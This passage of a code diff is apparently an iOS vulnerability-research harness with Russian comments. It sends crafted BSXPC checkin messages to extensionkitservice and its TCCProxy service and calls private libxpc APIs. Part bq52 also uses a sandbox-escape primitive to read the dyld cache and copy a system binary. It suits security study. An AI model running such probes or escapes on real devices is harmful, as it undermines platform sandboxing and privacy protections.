+        bq50_run(q, "activate-cid", NULL, m, 1, &n, tag, sizeof(tag));
+        if (n == 0) { nnoreply++; LOG("[bq50] activate-cid: MOLCH"); }
+        else if (strcmp(tag, "invalidate") && strcmp(tag, "ERR")) { pos++; LOG("[bq50] activate-cid: POSITIVE tag=%s", tag); }
+        else LOG("[bq50] activate-cid: rejected");
+    }
+
+    // 4) connect + lp (child-соединение; lp — строка из конструктора)
+    static const char *lps[] = { "Discovery", "TCCProxy", "Launch", "Observer" };
+    for (size_t i = 0; i < sizeof(lps)/sizeof(lps[0]); i++) {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m, "bsxpc", "connect");
+        xpc_dictionary_set_string(m, "lp", lps[i]);
+        char lbl[48];
+        snprintf(lbl, sizeof(lbl), "connect-lp=%s", lps[i]);
+        bq50_run(q, lbl, NULL, m, 1, &n, tag, sizeof(tag));
+        if (n == 0) { nnoreply++; LOG("[bq50] %s: MOLCH", lbl); }
+        else if (strcmp(tag, "invalidate") && strcmp(tag, "ERR")) { pos++; LOG("[bq50] %s: POSITIVE tag=%s", lbl, tag); }
+        else LOG("[bq50] %s: rejected", lbl);
+    }
+
+    // 5) вызов без тега — диспетчер пойдёт по bsxpc_SEL
+    static const char *sels[] = { "description", "ping", "connect" };
+    for (size_t i = 0; i < sizeof(sels)/sizeof(sels[0]); i++) {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m, "bsxpc_SEL", sels[i]);
+        char lbl[48];
+        snprintf(lbl, sizeof(lbl), "sel=%s", sels[i]);
+        bq50_run(q, lbl, NULL, m, 1, &n, tag, sizeof(tag));
+        if (n == 0) { nnoreply++; LOG("[bq50] %s: MOLCH", lbl); }
+        else if (strcmp(tag, "invalidate") && strcmp(tag, "ERR")) { pos++; LOG("[bq50] %s: POSITIVE tag=%s", lbl, tag); }
+        else LOG("[bq50] %s: rejected", lbl);
+    }
+
+    // 6) последовательность на одном соединении: activate -> вызов по SEL
+    {
+        int n = 0;
+        xpc_object_t pre = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(pre, "bsxpc", "activate");
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m, "bsxpc_SEL", "description");
+        bq50_run(q, "seq-activate+sel", pre, m, 2, &n, tag, sizeof(tag));
+        if (n >= 1 && strcmp(tag, "invalidate") && strcmp(tag, "ERR")) {
+            pos++;
+            LOG("[bq50] seq: POSITIVE (первый ответ tag=%s, nev=%d)", tag, n);
+        } else if (n == 0) {
+            nnoreply++;
+            LOG("[bq50] seq: MOLCH на оба сообщения");
+        } else LOG("[bq50] seq: оба отклонены (nev=%d)", n);
+    }
+
+    LOG("[bq50] done: control=%d pos=%d noreply=%d", ctl, pos, nnoreply);
+    LOG("[bq50] VERDICT: %s",
+        (pos > 0 || nnoreply > 0)
+            ? "handshake НЕ отклонён — ответ != invalidate, см. строки POSITIVE/MOLCH"
+            : "все варианты получили invalidate — activate/connect/SEL на "
+              "base-соединении отклоняются");
+}
+
+// p_bq51 — v199: CHECKIN-СООБЩЕНИЕ (lp+s+i) — wire-формат первого
+// сообщения BSXPC, восстановлен RE (§203):
+//   * листенер +[BSXPCServiceConnection
+//     _connectionWithIncomingXPCConnection:forEndpoint:] (0x18fb00044)
+//     берёт ПЕРВОЕ сообщение соединения, декодирует из него
+//     decodeStringForKey:'lp' (0x190027060); lp == nil ->
+//     "Rejected due to malformed checkin_info" -> invalidate
+//     (это и есть причина ВСЕХ invalidate в bq50 — там не было lp);
+//   * +[BSServiceListenerConnection _connectionFromIncomingConnection:]
+//     (0x18fb03924) декодирует из initiating-context:
+//       's' = service (0x1e0a7e7a8 -> CFSTR 's' 0x1e9e288f8; nil -> reject),
+//       'i' = instance (0x1e0a7e7b0 -> CFSTR 'i' 0x1e9e28918; опционален);
+//   * имя сервиса ищется в servicesByIdentifier домена: для
+//     extensionkitservice (§202) это {Discovery, Launch, Observer,
+//     TCCProxy} — неизвестное имя -> "Unknown service" -> invalidate;
+//   * `lp` — logging proem (любая непустая строка, сервер валидирует
+//     только наличие);
+//   * после успешного checkin/register — activate (bsxpc=activate,
+//     bsxpc_CID/CIDr), затем вызовы по bsxpc_SEL.
+// КОНТРОЛЬ (§144): голое {} без lp -> invalidate; lp без 's' -> тоже
+// invalidate (частичный checkin) — если control-empty НЕ даст invalidate,
+// детектор сломан, вердикты не выносить. Позитив = событие != invalidate
+// на полном checkin, либо МОЛЧАНИЕ (соединение зарегистрировано и живо)
+// при живом контроле.
+// Проба сервисов: s пробуется из {TCCProxy, Discovery, Launch, Observer}
+// (ключи Services домena §202) + полные имена; i = nil / "default".
+static void bq51_run(dispatch_queue_t q, const char *label,
+                     xpc_object_t __strong *seq, int nseq,
+                     int want, int *nev_out, char *tag_out, size_t tag_sz) {
+    __block int nev = 0;
+    __block BOOL done = NO;
+    if (tag_out && tag_sz) tag_out[0] = 0;
+    NSString *ls = @(label);
+    LOG("[bq51] run ENTER %s nseq=%d", label, nseq);
+    xpc_connection_t c = xpc_connection_create(
+        "com.apple.extensionkitservice", q);
+    if (!c) {
+        LOG("[bq51] %s: create NULL", label);
+        if (nev_out) *nev_out = -1;
+        return;
+    }   // xpc_object_t — ARC-объект, ручные xpc_release дают over-release
+    xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+        if (done || nev >= 6) return;
+        BOOL isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
+        const char *tag = NULL;
+        if (!isErr && xpc_get_type(ev) == XPC_TYPE_DICTIONARY)
+            tag = xpc_dictionary_get_string(ev, "bsxpc");
+        char *d = xpc_copy_description(ev);
+        LOG("[bq51] %s ev#%d %s bsxpc=%s: %.500s", ls.UTF8String, nev + 1,
+            isErr ? "[ERR]" : "[MSG]", tag ?: "-", d ?: "?");
+        free(d);
+        if (tag_out && tag_sz && !tag_out[0]) {
+            // ошибка XPC (connection invalid/interrupted) — это РЕДЖЕКТ
+            snprintf(tag_out, tag_sz, "%s", isErr ? "ERR" : (tag ?: "NOTAG"));
+        }
+        nev++;
+    });
+    xpc_connection_resume(c);
+    for (int i = 0; i < nseq; i++) {
+        xpc_connection_send_message(c, seq[i]);
+        if (i + 1 < nseq) usleep(400000);   // дать обработке устаканиться
+    }
+    for (int t = 0; t < 20 && nev < want; t++) usleep(100000);
+    if (nev == 0) LOG("[bq51] %s: NO EVENT in 2s", label);
+    done = YES;
+    xpc_connection_cancel(c);
+    LOG("[bq51] run EXIT %s nev=%d", label, nev);
+    if (nev_out) *nev_out = nev;
+}
+
+// собрать checkin-словарь: lp (proem) обязателен, s (service) обязателен
+// для listener-пути, i (instance) опционален
+static xpc_object_t bq51_checkin(const char *s, const char *i) {
+    xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(m, "lp", "BSXPC(com.apple.extensionkitservice)");
+    if (s) xpc_dictionary_set_string(m, "s", s);
+    if (i) xpc_dictionary_set_string(m, "i", i);
+    return m;
+}
+
+static void p_bq51(void) {
+    LOG("[bq51] v199 BSXPC checkin (lp+s+i): wire-формат первого сообщения");
+    dispatch_queue_t q = dispatch_queue_create("bq51.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0, ctl2 = 0, pos = 0, alive = 0, nreject = 0;
+    char tag[64];
+
+    // 1) КОНТРОЛЬ A: голое {} -> заведомо invalidate (§144)
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) { ctl = 1; }
+        LOG("[bq51] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    // 2) КОНТРОЛЬ B: lp без 's' -> частичный checkin -> тоже invalidate
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m, "lp", "BSXPC(com.apple.extensionkitservice)");
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-lp-only", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) { ctl2 = 1; }
+        LOG("[bq51] ctl-lp-only: nev=%d tag=%s -> partial-checkin %s",
+            n, tag[0] ? tag : "-", ctl2 ? "REJECTED (как и ожидалось)" : "НЕ reject?!");
+    }
+    if (!ctl) {
+        LOG("[bq51] CONTROL FAILED (нет invalidate на голом сообщении) — "
+            "детектор сломан, вердикты не выносятся (§144)");
+        return;
+    }
+
+    // 3) полный checkin (lp+s) по каждому сервису домена; i = nil и "default"
+    static const char *svcs[] = {
+        "TCCProxy", "Discovery", "Launch", "Observer",
+        "com.apple.extensionkitservice.TCCProxy", "XPCService.TCCProxy"
+    };
+    static const char *insts[] = { NULL, "default" };
+    for (size_t si = 0; si < sizeof(svcs)/sizeof(svcs[0]); si++) {
+        for (size_t ii = 0; ii < sizeof(insts)/sizeof(insts[0]); ii++) {
+            int n = 0;
+            xpc_object_t m = bq51_checkin(svcs[si], insts[ii]);
+            xpc_object_t seq[1] = { m };
+            char lbl[80];
+            snprintf(lbl, sizeof(lbl), "checkin-s=%s%s%s",
+                svcs[si], insts[ii] ? ",i=" : "", insts[ii] ?: "");
+            bq51_run(q, lbl, seq, 1, 1, &n, tag, sizeof(tag));
+            if (n == 0) {
+                alive++;
+                LOG("[bq51] %s: MOLCH (нет invalidate — checkin принят?)", lbl);
+            } else if (strcmp(tag, "invalidate") && strcmp(tag, "ERR")) {
+                pos++;
+                LOG("[bq51] %s: POSITIVE tag=%s", lbl, tag);
+            } else {
+                nreject++;
+                LOG("[bq51] %s: rejected tag=%s", lbl, tag);
+            }
+        }
+    }
+
+    // 4) checkin + activate + SEL-вызов на том же соединении (лучший
+    //    кандидат на рабочий диалог: checkin регистрирует соединение,
+    //    activate переводит, SEL — диспетчер вызова)
+    {
+        int n = 0;
+        xpc_object_t m0 = bq51_checkin("TCCProxy", NULL);
+        xpc_object_t m1 = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m1, "bsxpc", "activate");
+        xpc_dictionary_set_string(m1, "bsxpc_CID", "1");
+        xpc_dictionary_set_bool(m1, "bsxpc_CIDr", false);
+        xpc_object_t m2 = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m2, "bsxpc_SEL", "description");
+        xpc_object_t seq[3] = { m0, m1, m2 };
+        bq51_run(q, "seq-checkin+activate+sel(TCCProxy)", seq, 3, 2, &n,
+                 tag, sizeof(tag));
+        if (n == 0) {
+            alive++;
+            LOG("[bq51] seq TCCProxy: MOLCH на все 3 сообщения");
+        } else if (strcmp(tag, "invalidate") && strcmp(tag, "ERR")) {
+            pos++;
+            LOG("[bq51] seq TCCProxy: POSITIVE tag=%s nev=%d", tag, n);
+        } else {
+            nreject++;
+            LOG("[bq51] seq TCCProxy: rejected tag=%s nev=%d", tag, n);
+        }
+    }
+
+    // 5) то же с Launch (второй публичный подсервис)
+    {
+        int n = 0;
+        xpc_object_t m0 = bq51_checkin("Launch", "default");
+        xpc_object_t m1 = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m1, "bsxpc", "activate");
+        xpc_object_t m2 = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m2, "bsxpc_SEL", "description");
+        xpc_object_t seq[3] = { m0, m1, m2 };
+        bq51_run(q, "seq-checkin+activate+sel(Launch)", seq, 3, 2, &n,
+                 tag, sizeof(tag));
+        if (n == 0) { alive++; LOG("[bq51] seq Launch: MOLCH"); }
+        else if (strcmp(tag, "invalidate") && strcmp(tag, "ERR")) {
+            pos++; LOG("[bq51] seq Launch: POSITIVE tag=%s nev=%d", tag, n);
+        } else { nreject++; LOG("[bq51] seq Launch: rejected tag=%s", tag); }
+    }
+
+    LOG("[bq51] done: ctl=%d ctl2=%d pos=%d alive(molch)=%d rejected=%d",
+        ctl, ctl2, pos, alive, nreject);
+    LOG("[bq51] VERDICT: %s",
+        (pos > 0 || alive > 0)
+            ? "checkin ПРИНЯТ по крайней мере в одном варианте — "
+              "смотреть строки POSITIVE/MOLCH; это первый живой диалог "
+              "с extensionkitservice со времён §202"
+            : "все варианты (включая полный checkin lp+s+i) получили "
+              "invalidate — сервис-идентификаторы 's' не совпали с "
+              "servicesByIdentifier домена, нужен точный ключ");
+}
+
+// p_bq52 — v200: ROOT-путь BSXPC ('mx' в checkin) + резолв стабов
+// libobjcMsgSend1 (0x1900f5xxx/0x1900c4xxx) + статика extensionkitservice.
+//
+// Локальный RE (§203) закрывает карту сервера полностью:
+//   * после checkin (первое сообщение; 'lp' обязателен, иначе
+//     "malformed checkin_info" -> invalidate) block_invoke_2 домена
+//     (0x18fb00904) ветвится по containsValueForKey:'mx' (CFSTR 'mx'
+//     0x1e9e24558):
+//       - 'mx' ЕСТЬ -> muxed/root: гейт spec.multiplexingType != 0; для
+//         extensionkitservice mult = 3 (plist без 'Multiplexing',
+//         дефолт 0x18fb15778: mov w8,#3) -> configure: + блок-диспетчер
+//         0x18fb01098, логи "Incoming root connection is %@" /
+//         "Activating incoming root connection %@", activateNowWhenReady:
+//         — БЕЗ service-lookup и БЕЗ 's'/'i' в checkin;
+//       - 'mx' НЕТ -> plain: wrap требует 's' (fail -> cancel 0x18fb21db8
+//         -> invalidate), lookup servicesByIdentifier['s'] (fail ->
+//         "Unknown service" -> invalidate), успех -> "Registering
+//         incoming connection" + диспетчер 0x18fae48b4 (bsxpc-теги
+//         activate/connect/invalidate/interrupt; connect читает
+//         bsxpc_context-кодер + lp -> child; без тега — bsxpc_SEL).
+//   * идентификаторы сервисов = БЕЗ ПРЕФИКСОВ ключи plist Services
+//     (строитель 0x18fb17890 ключи не трансформирует) -> s="TCCProxy"
+//     из bq51 ДОЛЖЕН был пройти -> главный подозреваемый: первое
+//     сообщение не доходит до checkin-декодера (стабы 0x1900f58c0
+//     [getter сообщения], 0x1900f5810 [audit-token] лежат в
+//     отсутствующем локально сабфайле -> hexdump окон on-device).
+// КОНТРОЛИ (§144): {} -> invalidate; {lp} -> invalidate; {lp,s=TCCProxy}
+// повторяется в этом же прогоне. Позитив 'mx'-пробы = MOLCH на checkin
+// при живых контроллях, затем activate/SEL/connect-диалог на том же
+// соединении.
+static void bq52_root_dialog(dispatch_queue_t q, BOOL mx) {
+    __block int nev = 0;
+    __block BOOL done = NO;
+    const char *lbl = mx ? "mx=true" : "mx=false";
+    LOG("[bq52] root-dialog %s ENTER", lbl);
+    xpc_connection_t c = xpc_connection_create(
+        "com.apple.extensionkitservice", q);
+    if (!c) { LOG("[bq52] %s: create NULL", lbl); return; }
+    xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+        if (done || nev >= 8) return;
+        BOOL isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
+        const char *tg = (!isErr && xpc_get_type(ev) == XPC_TYPE_DICTIONARY)
+                             ? xpc_dictionary_get_string(ev, "bsxpc") : NULL;
+        char *d = xpc_copy_description(ev);
+        LOG("[bq52] %s ev#%d %s bsxpc=%s: %.600s", lbl, nev + 1,
+            isErr ? "[ERR]" : "[MSG]", tg ?: "-", d ?: "?");
+        free(d);
+        nev++;
+    });
+    xpc_connection_resume(c);
+    // 1) checkin: {lp, mx} — root-путь (без s/i)
+    xpc_object_t m1 = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(m1, "lp", "BSXPC(com.apple.extensionkitservice)");
+    xpc_dictionary_set_bool(m1, "mx", mx);
+    xpc_connection_send_message(c, m1);
+    for (int t = 0; t < 30 && nev == 0; t++) usleep(100000);
+    if (nev != 0) {
+        LOG("[bq52] %s: checkin ОТКЛОНЁН (nev=%d) — root не принят", lbl, nev);
+        done = YES;
+        xpc_connection_cancel(c);
+        return;
+    }
+    LOG("[bq52] %s: checkin MOLCH 3c — ROOT ПРИНЯТ (0x18fb00c08: "
+        "configure + activateNowOrWhenReady), соединение живо", lbl);
+    // 2) activate (диспетчер 0x18fae48b4, тег bsxpc)
+    xpc_object_t m2 = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(m2, "bsxpc", "activate");
+    xpc_connection_send_message(c, m2);
+    for (int t = 0; t < 15 && nev < 2; t++) usleep(100000);
+    LOG("[bq52] %s: после activate nev=%d (%s)", lbl, nev,
+        nev < 2 ? "MOLCH" : "ответ");
+    // 3) SEL-вызов без тега
+    xpc_object_t m3 = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(m3, "bsxpc_SEL", "description");
+    xpc_connection_send_message(c, m3);
+    for (int t = 0; t < 15 && nev < 3; t++) usleep(100000);
+    LOG("[bq52] %s: после SEL(description) nev=%d (%s)", lbl, nev,
+        nev < 3 ? "MOLCH" : "ответ");
+    // 4) connect: child-соединение к TCCProxy (bsxpc_context = endpoint:
+    //    encA 0x18fb08644 — s/i/t, e/o/nl/p опциональны)
+    xpc_object_t ctx = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(ctx, "s", "TCCProxy");
+    xpc_dictionary_set_string(ctx, "i", "");
+    xpc_dictionary_set_string(ctx, "t", "bq52");
+    xpc_object_t m4 = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(m4, "bsxpc", "connect");
+    xpc_dictionary_set_value(m4, "bsxpc_context", ctx);
+    xpc_dictionary_set_string(m4, "lp", "BSXPC(com.apple.extensionkitservice)");
+    xpc_connection_send_message(c, m4);
+    for (int t = 0; t < 20 && nev < 4; t++) usleep(100000);
+    LOG("[bq52] %s: после connect(TCCProxy) nev=%d (%s)", lbl, nev,
+        nev < 4 ? "MOLCH" : "ответ");
+    // финальное наблюдение
+    for (int t = 0; t < 15; t++) usleep(100000);
+    LOG("[bq52] %s: dialog total nev=%d %s", lbl, nev,
+        nev == 0 ? "(ВСЁ MOLCH — соединение молча принято и живо)" : "");
+    done = YES;
+    xpc_connection_cancel(c);
+}
+
+static void p_bq52(void) {
+    LOG("[bq52] v200: 'mx' root-checkin + окна стабов libobjcMsgSend1 + "
+        "статика extensionkitservice");
+    fsync(fileno(stderr));
+
+    // === 1. escape + hexdump окон стабов (данные в первую очередь) ===
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq52] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — статика/окна пропущены ***" : "");
+    fsync(fileno(stderr));
+
+    if (h >= 0) {
+        const char *candirs[] = {
+            "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld",
+            "/System/Library/Caches/com.apple.dyld",
+            "/System/Library/dyld",
+            "/private/var/db/dyld",
+        };
+        char cdir[1024] = {0};
+        for (unsigned i = 0; i < sizeof(candirs) / sizeof(candirs[0]) && !cdir[0];
+             i++) {
+            DIR *pd = opendir(candirs[i]);
+            if (!pd) { LOG("[bq52] dir %s: errno %d", candirs[i], errno); continue; }
+            struct dirent *pe;
+            while ((pe = readdir(pd)))
+                if (strstr(pe->d_name, "dyld_shared_cache_arm64e")) {
+                    snprintf(cdir, sizeof(cdir), "%s", candirs[i]);
+                    break;
+                }
+            closedir(pd);
+        }
+        if (!cdir[0]) {
+            LOG("[bq52] кэш-каталог не найден — окна недоступны");
+        } else {
+            LOG("[bq52] cache dir %s", cdir);
+            // окна: стабы 0x1900f5xxx (checkin-стабы) и 0x1900c4xxx
+            // (retain-семейство) — оба за границей локального .03-маппинга
+            // (0x188400000+0x7cb8000 = 0x1900b8000)
+            static const uint64_t WINB[] = { 0x1900f5000ULL, 0x1900c4000ULL };
+            static const uint64_t WINSZ = 0x1000ULL;
+            int found[2] = { 0, 0 };
+            DIR *cd = opendir(cdir);
+            struct dirent *ce;
+            while (cd && (ce = readdir(cd))) {
+                if (ce->d_name[0] == '.') continue;
+                if (strstr(ce->d_name, ".symbols")) continue;
+                if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+                char p[1400];
+                snprintf(p, sizeof(p), "%s/%s", cdir, ce->d_name);
+                int fd = open(p, O_RDONLY);
+                if (fd < 0) continue;
+                uint8_t hdr[0x18];
+                if (pread(fd, hdr, 0x18, 0) == 0x18) {
+                    uint32_t mo, mc;
+                    memcpy(&mo, hdr + 0x10, 4);
+                    memcpy(&mc, hdr + 0x14, 4);
+                    if (mc && mc <= 64) {
+                        static uint8_t mm[64 * 32];
+                        if (pread(fd, mm, mc * 32, mo) == (int)(mc * 32)) {
+                            for (uint32_t i = 0; i < mc; i++) {
+                                uint64_t addr, size, foff;
+                                memcpy(&addr, mm + i * 32, 8);
+                                memcpy(&size, mm + i * 32 + 8, 8);
+                                memcpy(&foff, mm + i * 32 + 16, 8);
+                                for (int w = 0; w < 2; w++) {
+                                    if (found[w]) continue;
+                                    if (addr <= WINB[w] &&
+                                        WINB[w] + WINSZ <= addr + size) {
+                                        static uint8_t buf[0x1000];
+                                        uint64_t fo = foff + (WINB[w] - addr);
+                                        if (pread(fd, buf, 0x1000, fo) == 0x1000) {
+                                            found[w] = 1;
+                                            LOG("[bq52] window%d %#llx из %s "
+                                                "(map %#llx+%#llx file+%#llx)",
+                                                w, (unsigned long long)WINB[w],
+                                                ce->d_name,
+                                                (unsigned long long)addr,
+                                                (unsigned long long)size,
+                                                (unsigned long long)foff);
+                                            for (int off = 0; off < 0x1000;
+                                                 off += 32) {
+                                                uint8_t *b = buf + off;
+                                                LOG("[bq52] w%d %04x: "
+                                                    "%02x%02x%02x%02x%02x%02x"
+                                                    "%02x%02x%02x%02x%02x%02x"
+                                                    "%02x%02x%02x%02x%02x%02x"
+                                                    "%02x%02x%02x%02x%02x%02x"
+                                                    "%02x%02x%02x%02x%02x%02x"
+                                                    "%02x%02x",
+                                                    w, off, b[0], b[1], b[2],
+                                                    b[3], b[4], b[5], b[6],
+                                                    b[7], b[8], b[9], b[10],
+                                                    b[11], b[12], b[13],
+                                                    b[14], b[15], b[16],
+                                                    b[17], b[18], b[19],
+                                                    b[20], b[21], b[22],
+                                                    b[23], b[24], b[25],
+                                                    b[26], b[27], b[28],
+                                                    b[29], b[30], b[31]);
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                close(fd);
+            }
+            if (cd) closedir(cd);
+            LOG("[bq52] windows: 0x1900f5000=%d 0x1900c4000=%d "
+                "(1 = дамп получен)", found[0], found[1]);
+        }
+
+        // === 2. статика extensionkitservice (70 КБ, читался ещё в v194) ===
+        const char *bp = "/System/Library/Frameworks/ExtensionFoundation"
+                         ".framework/XPCServices/extensionkitservice.xpc/"
+                         "extensionkitservice";
+        int bfd = open(bp, O_RDONLY);
+        if (bfd < 0) {
+            LOG("[bq52] extk open errno %d", errno);
+        } else {
+            static uint8_t bbuf[73728];
+            ssize_t got = pread(bfd, bbuf, sizeof(bbuf), 0);
+            LOG("[bq52] extk binary: %zd bytes", got);
+            fsync(fileno(stderr));
+            if (got > 0) {
+                char docp[1024];
+                snprintf(docp, sizeof(docp), "%s/Documents/extk.bin",
+                         getenv("HOME") ?: ".");
+                int dfd = open(docp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if (dfd >= 0) {
+                    ssize_t wr = write(dfd, bbuf, got);
+                    close(dfd);
+                    LOG("[bq52] copied %zd bytes to %s", wr, docp);
+                } else LOG("[bq52] copy errno %d", errno);
+                int n = 0;
+                for (ssize_t i = 0; i < got && n < 800; ) {
+                    if (bbuf[i] >= 0x20 && bbuf[i] < 0x7f) {
+                        ssize_t j = i;
+                        while (j < got && bbuf[j] >= 0x20 && bbuf[j] < 0x7f) j++;
+                        if (j - i >= 5) {
+                            LOG("[bq52] str %06zx: %.*s", (size_t)i,
+                                (int)(j - i), bbuf + i);
+                            n++;
+                        }
+                        i = j;
+                    } else i++;
+                }
+                LOG("[bq52] strings shown=%d", n);
+            }
+            close(bfd);
+        }
+        bad_query_release(h);
+        LOG("[bq52] escape released");
+    }
+    fsync(fileno(stderr));
+
+    // === 3. XPC-пробы ===
+    dispatch_queue_t q = dispatch_queue_create("bq52.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0, ctl2 = 0;
+    char tag[64];
+
+    // контроль A: голое {} -> invalidate (§144)
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq52] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) {
+        LOG("[bq52] CONTROL FAILED (нет invalidate на {}) — вердикты не "
+            "выносятся (§144)");
+        return;
+    }
+    // контроль B: {lp} без s/mx -> wrap-fail -> cancel -> invalidate
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(m, "lp", "BSXPC(com.apple.extensionkitservice)");
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-lp", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl2 = 1;
+        LOG("[bq52] ctl-lp: nev=%d tag=%s -> partial-checkin %s",
+            n, tag[0] ? tag : "-", ctl2 ? "REJECTED (ожидаемо)" : "НЕ reject?!");
+    }
+    // plain-повтор в этом же прогоне: {lp, s=TCCProxy} (без mx)
+    {
+        int n = 0;
+        xpc_object_t m = bq51_checkin("TCCProxy", NULL);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "plain-s=TCCProxy", seq, 1, 1, &n, tag, sizeof(tag));
+        LOG("[bq52] plain-s=TCCProxy: nev=%d tag=%s", n, tag[0] ? tag : "-");
+    }
+    // главные пробы: root-диалоги с 'mx'
+    bq52_root_dialog(q, false);
+    bq52_root_dialog(q, true);
+
+    LOG("[bq52] done: ctl=%d ctl2=%d", ctl, ctl2);
+    LOG("[bq52] VERDICT: смотреть root-dialog строки: MOLCH на checkin = "
+        "root-путь принят (первое сообщение декодируется, mult=3 — "
+        "гейт пройден); invalidate на {lp,mx} при живых контролях = "
+        "checkin-сообщение не доходит до декодера — резолвить стабы из "
+        "окон w0/w1");
+}
+
+// p_bq53 — v201: BSXPC checkin через ПРИВАТНЫЙ libxpc-API.
+// RE-карта (§204) — ПОЧЕМУ bq44-52 всегда получали invalidate:
+//   * сервер читает checkin НЕ из первого сообщения на проводе, а из
+//     ПРИВАТНОГО СЛОТА соединения: _xpc_connection_get_bs_checkin_info
+//     (0x1805b18c8): слот conn+0x90 (сериализатор) + conn+0x98 (размер),
+//     one-shot, только peer-тип + не-live (state conn+0x40 == 0);
+//   * слот заполняет КЛИЕНТ до resume:
+//     xpc_connection_set_bs_type (0x1805b1510) +
+//     xpc_connection_set_bs_checkin_info (0x1805b1664: сериализует
+//     словарь в слот; требует bs_type != NONE);
+//   * при resume libxpc клиент шлёт setup-сообщение 'wINt' (msgh_id
+//     0x77494e74; без чекина — 'w00t' 0x77303074) с чекином на +0x34;
+//     сервер-парсер копирует payload в conn+0x90 (тег сериализации
+//     0x996d4fd9) — ГЕЙТЫ: port-derivation ("Failed to verify check-in
+//     connection port was derived from the listener port") + CS
+//     ("Dropping check-in message due to code signing requirement").
+// ПЕРВЫЙ ПРОГОН (краш на V0): оба символа ЭКСПОРТИРОВАНЫ — dlsym даёт
+//   xpc_connection_set_bs_type = slide+0x1805b1510 (совпадение с RE!),
+//   xpc_connection_set_bs_checkin_info = slide+0x1805b1664;
+//   slide = 0x1d2bc000 (dladdr(xpc_connection_create) - 0x180599000).
+//   Краш = os_crash assertion ВНУТРИ set_bs_type(3): для соединения
+//   kind==0 (xpc_connection_create по имени, не из endpoint)
+//   разрешён ТОЛЬКО bs_type=1 (TBD); 2 (SPECIFIC)/3 (ANY) требуют
+//   kind!=0 ("Cannot set specific when not from endpoint"). Никаких
+//   больше 2/3 на kind==0 — каждый такой вызов убивает приложение.
+// V202: bs_type=1 (TBD) на всех пробах, вызовы напрямую extern-символами
+// (линкер биндит экспорт из кэша — PAC не нужен), set_bs_checkin_info
+// возвращает bool (проверяется). КОНТРОЛИ (§144): {} без чекина ->
+// invalidate; lp-only чекин -> wrap-fail -> invalidate (ожидаемо).
+// Позитив = set_bs_checkin_info -> true + НЕТ invalidate после resume
+// (слот доставлен и принят) + живой activate/SEL-диалог.
+extern void xpc_connection_set_bs_type(xpc_connection_t c, uint64_t t);
+extern bool xpc_connection_set_bs_checkin_info(xpc_connection_t c, xpc_object_t o);
+
+static void bq53_dialog(dispatch_queue_t q, const char *label, int bstype,
+                        xpc_object_t dict, xpc_object_t __strong *seq, int nseq) {
+    __block int nev = 0;
+    __block BOOL done = NO;
+    NSString *ls = @(label);
+    LOG("[bq53] run ENTER %s bs_type=%d nseq=%d", label, bstype, nseq);
+    xpc_connection_t c = xpc_connection_create(
+        "com.apple.extensionkitservice", q);
+    if (!c) { LOG("[bq53] %s: create NULL", label); return; }
+    xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+        if (done || nev >= 8) return;
+        BOOL isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
+        const char *tag = (!isErr && xpc_get_type(ev) == XPC_TYPE_DICTIONARY)
+                              ? xpc_dictionary_get_string(ev, "bsxpc") : NULL;
